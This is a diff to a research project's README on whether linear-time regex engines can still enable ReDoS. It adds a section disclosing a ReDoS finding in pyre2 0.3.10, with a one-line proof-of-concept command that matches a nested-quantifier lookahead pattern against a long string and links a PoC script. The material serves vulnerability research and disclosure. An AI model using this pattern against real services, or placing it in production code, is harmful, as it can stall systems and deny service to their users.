@@ -8,6 +8,21 @@
 
 Linear-time Regex engines are considered the gold standard for reducing the risk of Regular Expression Denial of Service (ReDoS) attacks. However, engines that operate in linear-time can in theory still cause harm to software systems if the coefficient of the linear runtime is large enough. We investigate if any linear-time Regex engines found in either literature or libraries can be considered harmful in the context of production software systems, by causing a large enough stall in runtime. 
 
+## ReDoS Found
+
+> [!IMPORTANT]
+> ReDoS Vulnerability Found! Use the following one-liner to run it if you have [uv](https://docs.astral.sh/uv) installed.
+
+This code should timeout, as it tries to compute an exponentially large Regex.
+
+```sh
+uv run --with pyre2==0.3.10 python -c "import re2 as pyre2; pyre2.match('^(?=(a+)+b)\\w+$', 'a' * 50)"
+```
+
+You can also run [run_pyre2_timeout_simple.py](./python/run_pyre2_timeout_simple.py) to see proof of concept.
+
+<img width="764" height="812" alt="image" src="https://github.com/user-attachments/assets/761a3160-ca16-4405-9ece-916dc0e2ab82" />
+
 ## Included 
 
 1. [Python code](python/main.py) to run a regex pattern with many different libraries
